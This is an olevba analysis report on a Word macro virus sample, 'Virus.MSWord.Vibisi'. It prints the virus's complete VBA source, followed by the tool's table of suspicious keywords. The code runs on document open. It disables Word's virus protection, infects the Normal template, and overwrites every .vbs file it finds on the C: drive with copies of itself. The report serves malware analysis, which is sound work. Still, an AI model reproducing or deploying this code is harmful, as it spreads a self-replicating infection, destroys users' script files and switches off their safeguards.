olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vibisi-eebb935ffc477a9c636bacfa452887d7dca6623e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vibisi-eebb935ffc477a9c636bacfa452887d7dca6623e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO vbs.bas 
in file: Virus.MSWord.Vibisi-eebb935ffc477a9c636bacfa452887d7dca6623e - OLE stream: 'Macros/VBA/vbs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub vibisi()
On Error Resume Next
Dim fso, f, wo

Set fso = CreateObject("scripting.filesystemobject")
Set f = fso.opentextfile(wscript.scriptfullname, 1)

Code = f.readall

Set wo = CreateObject("word.application")

With wo.Application.FileSearch
        .LookIn = "c:\"
        .SearchSubFolders = True
        .FileName = "*.vbs"
        .Execute
End With

Set f = Nothing

For i = 1 To wo.Application.FileSearch.FoundFiles.Count
        Set f = fso.opentextfile(wo.Application.FileSearch.FoundFiles(i), 2, True)
        f.writeline Code
Next

wo.Options.VirusProtection = (Rnd * 0)
wo.Options.SaveNormalPrompt = (Rnd * 0)

wo.NormalTemplate.VBProject.VBComponents.Import wscript.scriptfullname
wo.NormalTemplate.VBProject.VBComponents(wo.NormalTemplate.VBProject.VBComponents.Count).Name = "vbs"
wo.NormalTemplate.VBProject.VBComponents("vbs").CodeModule.deletelines 1, 1
wo.NormalTemplate.Save
wo.Quit

End Sub

Sub autoopen()
On Error Resume Next

Options.VirusProtection = (Rnd * 0)
Options.SaveNormalPrompt = (Rnd * 0)

ThisDocument.VBProject.VBComponents("vbs").Export "c:\scriptO8.ini"

If Len(NormalTemplate.VBProject.VBComponents("vbs").Name) = 0 Then NormalTemplate.VBProject.VBComponents.Import "c:\scriptO8.ini"

If Len(ActiveDocument.VBProject.VBComponents("vbs").Name) = 0 Then
        ActiveDocument.VBProject.VBComponents.Import "c:\scriptO8.ini"
        ActiveDocument.SaveAs ActiveDocument.FullName
End If

With Application.FileSearch
        .LookIn = "c:\"
        .SearchSubFolders = True
        .FileName = "*.vbs"
        .Execute
End With

For x = 1 To Application.FileSearch.FoundFiles.Count
        Set fso = CreateObject("scripting.filesystemobject")
        Set f = fso.opentextfile(Application.FileSearch.FoundFiles(x), 2, True)
        codex = "call vibisi" & Chr(13) & ThisDocument.VBProject.VBComponents("vbs").CodeModule.Lines(1, ThisDocument.VBProject.VBComponents("vbs").CodeModule.CountOfLines)
        f.write codex
Next

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

